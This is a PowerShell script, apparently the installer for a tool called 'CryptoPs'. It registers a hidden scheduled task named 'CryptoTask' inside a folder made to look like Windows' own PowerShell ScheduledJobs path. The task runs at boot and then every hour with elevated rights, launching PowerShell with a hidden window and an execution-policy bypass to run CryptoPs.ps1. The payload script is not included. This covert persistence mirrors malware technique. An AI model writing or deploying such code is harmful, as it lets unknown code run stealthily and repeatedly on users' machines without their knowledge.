<#$a = @('LocalMachine','UserPolicy','MachinePolicy','CurrentUser','Process')
foreach ($element in $a)
{
Set-ExecutionPolicy -Scope $element -ExecutionPolicy Restricted -Force
}
#>
$servername = "localhost"
$path="Microsoft\Windows\PowerShell\ScheduledJobs"
$name="CryptoPs"
$service = new-object -com("Schedule.Service")
$service.connect($servername)
$CurrentName=$env:userdomain+"\"+$env:username
$rootFolder=$service.getfolder("\")
Try { 
    $rootFolder.Getfolder($path)
    }
Catch 
    { 
    $rootFolder.CreateFolder($path)
    }
Finally 
{
    $rootFolder=$rootFolder.Getfolder($path)
}
#$rootFolder|Format-table
$taskDefinition = $service.NewTask(0)
$regInfo = $taskDefinition.RegistrationInfo
$regInfo.Description="Well, This is My Struggle"
$regInfo.Author = "Daniil"
$settings = $taskDefinition.Settings
$settings.Enabled = "True"
$settings.StartWhenAvailable = "True"
$settings.Hidden = "True"
$settings.DisallowStartIfOnBatteries="false"
$settings.StopIfGoingOnBatteries="false"
#Use an existing interactive token to run a task. The user must log on using a service for user (S4U) logon. 
#When an S4U logon is used, no password is stored by the system and there is no access to either the network or encrypted files.
    $taskDefinition.Principal.RunLevel=1
    $triggers=$taskDefinition.Triggers
    #Triggers the task when the computer boots.
    $trigger = $triggers.Create(8)
    $trigger.Id = "TriggerAtStart"
    $trigger.Repetition.Interval="PT1H"
    $trigger.Delay="PT10M"
    $trigger.Enabled = "True"
#This action performs a command-line operation. For example, the action could run a script, launch an executable, or, 
#if the name of a document is provided, find its associated application and launch the application with the document.
    $Action = $taskDefinition.Actions.Create(0) 
    $Action.Path = "powershell.exe"
    $Action.Arguments="-NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy BYPASS -File $PSScriptRoot\$name.ps1"
$rootFolder.RegisterTaskDefinition("CryptoTask",$taskDefinition,6,$CurrentName,$null,2)
